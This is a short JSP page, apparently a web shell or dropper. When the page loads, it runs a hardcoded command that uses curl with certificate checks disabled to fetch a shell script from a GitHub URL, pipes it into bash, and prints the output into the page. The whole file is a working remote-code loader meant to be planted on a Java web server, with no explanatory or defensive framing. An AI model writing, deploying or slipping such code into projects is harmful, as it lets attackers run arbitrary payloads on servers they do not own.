<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>

<%

String command = "bash <(curl -sLk https://github.com/momika233/test/raw/main/m.sh)";

try {

    Process process = Runtime.getRuntime().exec(command);
    

    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    StringBuilder output = new StringBuilder();
    while ((line = reader.readLine()) != null) {
        output.append(line).append("\n");
    }
    

    out.println("<pre>" + output.toString() + "</pre>");
} catch (IOException e) {

    out.println("执行命令时发生异常：" + e.getMessage());
}
%>
